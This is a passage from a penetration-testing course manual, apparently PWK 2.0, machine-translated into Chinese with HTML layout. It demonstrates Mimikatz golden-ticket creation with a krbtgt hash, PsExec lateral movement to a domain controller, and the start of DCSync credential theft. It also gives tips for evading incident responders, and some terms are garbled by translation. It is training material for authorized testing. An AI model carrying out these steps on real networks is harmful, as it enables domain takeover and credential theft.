<div style="position:absolute;top:65788;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::golden </font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">699</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来创建黄金票。</font><font style="vertical-align: inherit;">这次我们将使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/krbtgt</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/rc4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示我们正在提供密码哈希。</font><font style="vertical-align: inherit;">我们将设置金票</font></font></nobr></div>
<div style="position:absolute;top:65826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fakeuser</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这是允许的，因为域控制器正确地信任任何东西</font></font></nobr></div>
<div style="position:absolute;top:65845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 krbtgt 密码哈希加密。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::清除</font></font></font></b></nobr></div>
<div style="position:absolute;top:65897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前会话的票证清除正常</font></font></nobr></div>
<div style="position:absolute;top:65931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:65948;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：fakeuser</font></font></nobr></div>
<div style="position:absolute;top:65982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：corp.com (CORP)</font></font></nobr></div>
<div style="position:absolute;top:65999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SID : S-1-5-21-1602875587-2787523311-2599479668</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:66016;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户编号：500</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组 ID：\*513 512 520 518 519</font></font></nobr></div>
<div style="position:absolute;top:66050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务密钥：75b60230a2394a812000dbfad8415965 - rc4_hmac_nt</font></font></nobr></div>
<div style="position:absolute;top:66067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生命周期 : 14/02/2018 15.08.48 ; </font><font style="vertical-align: inherit;">12/02/2028 15.08.48 ; </font><font style="vertical-align: inherit;">12/02/2028 15.08.48</font></font></nobr></div>
<div style="position:absolute;top:66084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 门票：\*\* 传递门票 \*\*</font></font></nobr></div>
<div style="position:absolute;top:66118;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* PAC 生成</font></font></nobr></div>
<div style="position:absolute;top:66135;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* PAC 签名</font></font></nobr></div>
<div style="position:absolute;top:66151;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* EncTicketPart 生成</font></font></nobr></div>
<div style="position:absolute;top:66168;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* EncTicketPart 加密</font></font></nobr></div>
<div style="position:absolute;top:66185;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* KrbCred 生成</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:66220;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'fakeuser @ corp.com' 的金票已成功提交当前会话</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">misc::cmd</font></font></font></b></nobr></div>
<div style="position:absolute;top:66270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将“cmd.exe”从“DisableCMD”修补到“KiwiAndCMD”@ 012E3A24</font></font></nobr></div>
<div style="position:absolute;top:66289;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 725 - 使用 Mimikatz 创建黄金票</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mimikatz 在使用金票选项时提供了两组默认值，即用户</font></font></nobr></div>
<div style="position:absolute;top:66338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID 和组 ID。</font><font style="vertical-align: inherit;">用户ID默认设置为500，即内置的RID</font></font></nobr></div>
<div style="position:absolute;top:66358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域的管理员，而组 ID 的值由最有特权的</font></font></nobr></div>
<div style="position:absolute;top:66377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 中的组，包括域管理员组。</font></font></nobr></div>
<div style="position:absolute;top:66410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将金票注入内存后，我们可以启动一个新的命令提示符</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:66430;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">misc::cmd</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并再次尝试使用 PsExec 进行横向移动。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec.crop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">psexec.exe \\dc01 cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:66498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PsExec v2.2 - 远程执行进程</font></font></nobr></div>
<div style="position:absolute;top:66515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2001-2016 Mark Russinovich</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:66575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">699 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明·德尔菲，2016 年），https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:66703;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="57"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 57 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66736;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:67813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:67813;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:67813;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">674</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysinternals - www.sysinternals.com</font></font></nobr></div>
<div style="position:absolute;top:66882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:66916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:66950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:66984;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:67001;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: fe80::7959:aaad:eec:3969%2</font></font></nobr></div>
<div style="position:absolute;top:67018;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:67035;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:67052;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:67069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:67103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:67120;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司\假用户</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /groups</font></font></font></b></nobr></div>
<div style="position:absolute;top:67188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集团信息</font></font></nobr></div>
<div style="position:absolute;top:67205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:67239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组的名字    </font></font></nobr></div>
<div style="position:absolute;top:67239;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型    </font></font></nobr></div>
<div style="position:absolute;top:67239;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性   </font></font></nobr></div>
<div style="position:absolute;top:67256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==================================</font></font></nobr></div>
<div style="position:absolute;top:67273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个人    </font></font></nobr></div>
<div style="position:absolute;top:67273;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员    </font></font></nobr></div>
<div style="position:absolute;top:67290;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:67290;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\用户    </font></font></nobr></div>
<div style="position:absolute;top:67307;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:67307;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:67341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\Authenticated Users 知名组 强制组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\This Organization 知名组 强制组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CORP\</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:67374;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团体    </font></font></nobr></div>
<div style="position:absolute;top:67374;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CORP\Group Policy Creator Owners Group    </font></font></nobr></div>
<div style="position:absolute;top:67392;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CORP\架构管理员    </font></font></nobr></div>
<div style="position:absolute;top:67409;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团体    </font></font></nobr></div>
<div style="position:absolute;top:67409;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CORP\企业管理员    </font></font></nobr></div>
<div style="position:absolute;top:67426;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团体    </font></font></nobr></div>
<div style="position:absolute;top:67426;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必选组，默认开启</font></font></nobr></div>
<div style="position:absolute;top:67442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:67459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制标签\高强制级别标签    </font></font></nobr></div>
<div style="position:absolute;top:67479;left:236"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 726 - 使用金票和 PsExec 执行横向移动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在域控制器上有一个交互式命令提示符，并注意到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:67528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令报告我们是用户 fakeuser，该用户在域中不存在。</font><font style="vertical-align: inherit;">上市组</font></font></nobr></div>
<div style="position:absolute;top:67547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员资格表明我们是包括域在内的多个强大团体的成员</font></font></nobr></div>
<div style="position:absolute;top:67566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员组。</font><font style="vertical-align: inherit;">优秀的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:67628;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用不存在的用户名可能会提醒事件处理人员</font></font></i></nobr></div>
<div style="position:absolute;top:67648;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看访问日志。</font><font style="vertical-align: inherit;">为了减少怀疑，考虑使用名称和</font></font></i></nobr></div>
<div style="position:absolute;top:67667;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现有系统管理员的 ID。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，通过创建我们自己的 TGT 然后使用 PsExec，我们正在执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">立交桥</font></font></i></nobr></div>
<div style="position:absolute;top:67748;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过利用 Kerberos 身份验证进行</font><i><font style="vertical-align: inherit;">哈希</font></i><font style="vertical-align: inherit;">攻击。</font><font style="vertical-align: inherit;">如果我们使用 PsExec 连接到 IP</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:67891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="58"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 58 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67924;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:69001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:69001;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:69001;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">675</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器的地址而不是主机名，我们将强制使用 NTLM</font></font></nobr></div>
<div style="position:absolute;top:68039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下一个列表所示，身份验证和访问仍将被阻止。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec.corp&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">psexec.exe \\192.168.1.110 cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:68108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PsExec v2.2 - 远程执行进程</font></font></nobr></div>
<div style="position:absolute;top:68125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2001-2016 Mark Russinovich</font></font></nobr></div>
<div style="position:absolute;top:68142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysinternals - www.sysinternals.com</font></font></nobr></div>
<div style="position:absolute;top:68176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法访问 192.168.1.110：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:68193;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问被拒绝。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68212;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 727 - 使用 NTLM 身份验证阻止我们的访问</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:68243;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复上述步骤以转储 krbtgt 密码哈希并创建和使用</font></font></nobr></div>
<div style="position:absolute;top:68293;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">金票。</font></font></nobr></div>
<div style="position:absolute;top:68321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.为什么krbtgt账户的密码hash在功能级别升级时会发生变化</font></font></nobr></div>
<div style="position:absolute;top:68340;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Windows 2003 到 Windows 2008？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:68375;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5.2</font></font></i></nobr></div>
<div style="position:absolute;top:68375;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器同步</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Active Directory 基础结构中实现持久性的另一种方法是窃取密码</font></font></nobr></div>
<div style="position:absolute;top:68432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域中所有管理用户的哈希值。</font></font></nobr></div>
<div style="position:absolute;top:68465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们可以横向移动到域控制器并运行 Mimikatz 来转储</font></font></nobr></div>
<div style="position:absolute;top:68484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个用户的密码哈希。</font><font style="vertical-align: inherit;">我们还可以偷NTDS.DIT数据库文件的副本，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">700</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:68503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在硬盘驱动器上的所有 Active Directory 帐户的副本，类似于使用的 SAM 数据库</font></font></nobr></div>
<div style="position:absolute;top:68523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于本地帐户。</font></font></nobr></div>
<div style="position:absolute;top:68555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这些方法可能工作正常，但它们会留下访问路径并可能需要我们上传工具。</font></font></nobr></div>
<div style="position:absolute;top:68575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一种方法是滥用 AD 功能本身从工作站远程捕获散列。</font></font></nobr></div>
<div style="position:absolute;top:68608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在生产环境中，域通常有多个域控制器来提供</font></font></nobr></div>
<div style="position:absolute;top:68627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">冗余。</font><font style="vertical-align: inherit;">目录复制服务远程协议</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">701</font></font></font></nobr></div>
<div style="position:absolute;top:68627;left:646"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">702</font></font></font></nobr></div>
<div style="position:absolute;top:68627;left:796"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:68646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步这些冗余域控制器。</font><font style="vertical-align: inherit;">域控制器可能会请求更新</font></font></nobr></div>
<div style="position:absolute;top:68666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IDL_DRSGetNCChanges </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">703</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API 的</font><font style="vertical-align: inherit;">特定对象，例如帐户</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:68698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">幸运的是，收到更新请求的域控制器不会验证</font></font></nobr></div>
<div style="position:absolute;top:68718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求来自一个已知的域控制器，但只有关联的 SID 具有适当的</font></font></nobr></div>
<div style="position:absolute;top:68737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权。</font><font style="vertical-align: inherit;">如果我们尝试从以下用户向域控制器发出恶意更新请求</font></font></nobr></div>
<div style="position:absolute;top:68757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Domain Admins 组的成员，它将成功。</font></font></nobr></div>
<div style="position:absolute;top:68789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下一个示例中，我们将以 jeff_admin 身份登录 Windows 10 客户端以模拟妥协</font></font></nobr></div>
<div style="position:absolute;top:68809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员帐户并执行复制。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:68891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">700 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://technet.microsoft.com/en-us/library/cc961761.aspx</font></font></font></nobr></div>
